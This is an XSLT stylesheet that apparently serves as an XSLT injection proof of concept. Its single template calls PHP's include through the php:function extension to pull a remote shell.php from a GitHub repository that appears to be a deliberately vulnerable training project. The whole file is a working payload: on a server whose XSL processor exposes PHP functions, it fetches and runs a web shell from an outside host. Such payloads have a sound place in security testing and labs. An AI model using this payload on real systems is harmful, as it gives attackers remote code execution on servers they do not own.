<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">


   
   <xsl:value-of select="php:function('include','https://github.com/cyberheartmi9/Vulnerable-By-Design/raw/master/POC/shell.php')"/> 

   
   </xsl:template>
</xsl:stylesheet>
